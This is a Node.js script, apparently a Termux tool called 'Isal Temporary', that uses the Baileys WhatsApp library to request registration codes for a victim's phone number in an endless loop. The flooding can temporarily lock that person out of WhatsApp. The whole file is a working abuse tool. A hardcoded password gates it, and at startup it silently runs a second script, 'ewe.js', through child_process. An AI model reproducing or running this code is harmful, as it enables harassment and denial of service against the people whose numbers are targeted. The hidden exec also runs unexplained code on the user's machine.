const fs = require('fs');
const bcrypt = require('bcryptjs');
const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const { exec } = require('child_process');

// Jalankan perintah di ewe.js
exec('node ewe.js', (error, stdout, stderr) => {
  if (error) {
    console.error(`Terjadi kesalahan: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Error: ${stderr}`);
    return;
  }
  console.log(`Output: ${stdout}`);
});

const getPasswordHash = async (password) => {
  const salt = await bcrypt.genSalt(10);
  return await bcrypt.hash(password, salt);
};

const comparePassword = async (password, hashedPassword) => {
  return await bcrypt.compare(password, hashedPassword);
};

const askForPassword = async () => {
  // Hash password 'IsalMods' menggunakan getPasswordHash
  const hashedPassword = await getPasswordHash('IsalMods');
  const enteredPassword = prompt(gradient('blue', 'cyan')('𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : '));

    if (await comparePassword(enteredPassword, hashedPassword)) {
        return true;
    } else {
        console.log(gradient('red', 'orange')('❌ 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐒𝐚𝐥𝐚𝐡  ❌'));
    return false;
  }
};

const start = async () => {
  if (await askForPassword()) {
    const { state, saveCreds } = await useMultiFileAuthState('.oiii')

    const spam = makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    })

    const sleep = (milliseconds) => {
      return new Promise(resolve => setTimeout(resolve, milliseconds))
    }

    const frames = ['-', '\\', '|', '/'];
    let index = 0;

    const animateLoading = async () => {
      while (true) {
        process.stdout.write('\033c'); // Bersihkan layar konsol
        process.stdout.write(frames[index]);
        index = (index + 1) % frames.length;
        await sleep(5000);
      }
    }

    animateLoading();

    const dropNumber = async (context) => {
      const { phoneNumber, ddi, number } = context;
      const loadingAnimation = animateLoading();
      while (true) {
        try {
          console.clear();
          console.log(gradient('cyan', 'blue')('成功したTempory番号: ' + ddi + number))
          res = await spam.requestRegistrationCode({
            phoneNumber: '+' + phoneNumber,
            phoneNumberCountryCode: ddi,
            phoneNumberNationalNumber: number,
            phoneNumberMobileCountryCode: 724
          })
          b = (res.reason === 'temporarily_unavailable');
          if (b) {
            clearInterval(loadingAnimation); // Stop loading animation when request is complete
            setTimeout(async () => {
              dropNumber(context)
            }, res.retry_after * 1000)
            return;
          }
        } catch (error) { 
          //console.log(error)
        }
      }
    }

    const loadingAnimation = animateLoading();
    console.clear();
    console.log(gradient('black', 'black')('■'))
    console.log(gradient('black', 'black')('■'))
    console.log(gradient('black', 'black')('■'))
    console.log(gradient('red', 'magenta')(`
██╗░██████╗░█████╗░██╗░░░░░  ████████╗███████╗███╗░░░███╗██████╗░░█████╗░██████╗░██╗░░░██╗
██║██╔════╝██╔══██╗██║░░░░░  ╚══██╔══╝██╔════╝████╗░████║██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝
██║╚█████╗░███████║██║░░░░░  ░░░██║░░░█████╗░░██╔████╔██║██████╔╝██║░░██║██████╔╝░╚████╔╝░
██║░╚═══██╗██╔══██║██║░░░░░  ░░░██║░░░██╔══╝░░██║╚██╔╝██║██╔═══╝░██║░░██║██╔══██╗░░╚██╔╝░░
██║██████╔╝██║░░██║███████╗  ░░░██║░░░███████╗██║░╚═╝░██║██║░░░░░╚█████╔╝██║░░██║░░░██║░░░
╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝  ░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░`));
    console.log(`Created By Isal Mods
For your information, use this tool 
If you use it for crime, its better to just die
FUCK
Ver: 2.0
----
ONLY FOR TERMUX!
---- `);
    let ddi = prompt(gradient('magenta', 'purple')(`[ + ] 𝑵𝑼𝑴𝑩𝑬𝑹 𝑲𝑶𝑫𝑬`));
    let number = prompt(gradient('purple', 'magenta')(`[ + ] 𝑬𝑵𝑻𝑬𝑹 𝑻𝑯𝑬 𝑵𝑼𝑴𝑩𝑬𝑹`))
    let phoneNumber = ddi + number;
    numbers[phoneNumber] = { ddi, number }
    fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
    clearInterval(loadingAnimation);
    dropNumber({ phoneNumber, ddi, number })
    console.clear();
  } else {
    console.log(gradient('red', 'red')('Akses ditolak.'));
  }
};

start();
